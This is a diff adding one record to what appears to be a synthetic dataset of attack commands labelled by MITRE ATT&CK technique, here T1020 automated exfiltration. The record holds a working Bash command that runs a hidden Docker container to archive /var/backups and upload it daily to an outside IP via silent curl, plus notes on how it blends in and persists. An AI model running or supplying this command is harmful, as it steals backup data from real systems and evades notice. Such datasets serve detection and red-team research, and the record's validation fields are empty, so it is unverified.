@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_backups --network host -e HN=$(hostname) -v /var/backups:/data:ro curlimages/curl:8.8.0 sh -c 'while true; do TS=$(date +%s); tar -C /data -cz . | curl -s -H \"Content-Type: application/octet-stream\" --data-binary @- \"https://203.0.113.15/ingest/$HN/backups_$TS.tgz\"; sleep 86400; done'",
+  "explanation": "Exfiltrates /var/backups once per day via HTTPS with minimal output, running continuously in the background.",
+  "rationale_steps": [
+    "Accesses backups through a read-only bind mount",
+    "Automates daily transfer using a long sleep interval",
+    "Uses HTTPS and silent curl to blend in and reduce noise",
+    "Detached container provides persistence without host changes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-f12262af",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
